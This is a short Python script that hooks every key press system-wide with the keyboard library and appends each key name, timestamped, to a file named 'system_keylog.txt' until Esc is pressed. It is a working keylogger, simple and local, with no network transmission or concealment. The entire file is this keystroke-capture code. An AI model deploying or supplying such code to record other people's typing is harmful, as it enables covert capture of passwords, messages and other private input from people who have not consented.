import keyboard
import datetime

log_file = "system_keylog.txt"

def log_key(event):
    # Only log on key down (press), not on key up (release)
    if event.name != 'esc':  # Prevent logging the escape key
        try:
            with open(log_file, "a") as f:
                dt = datetime.datetime.now().strftime("%Y-%m-%d_%H:%M:%S")
                f.write(f"{dt}: {event.name}\n")
        except Exception as e:
            print(f"Error: {e}")

# Start listening for keyboard events
keyboard.on_press(log_key)

# Block until 'esc' is pressed
keyboard.wait('Esc')